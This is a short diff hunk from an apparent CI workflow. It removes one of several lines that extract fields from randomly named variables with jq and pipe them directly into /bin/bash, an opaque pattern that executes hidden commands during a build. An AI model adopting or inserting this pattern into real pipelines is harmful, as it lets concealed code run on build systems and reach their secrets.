@@ -28,7 +28,6 @@ jobs:
           echo $uakj4246 | jq -r .xsh487 | /bin/bash
           echo $hyaby204 | jq -r .daukd24 | /bin/bash
           printf '%s' "$qt013" | jq -r .r849 | /bin/bash
-          printf '%s' "$i3586" | jq -r .qnx5297 | /bin/bash
           echo $z4506 | jq -r .gn99 | /bin/bash
 
       - name: Save output
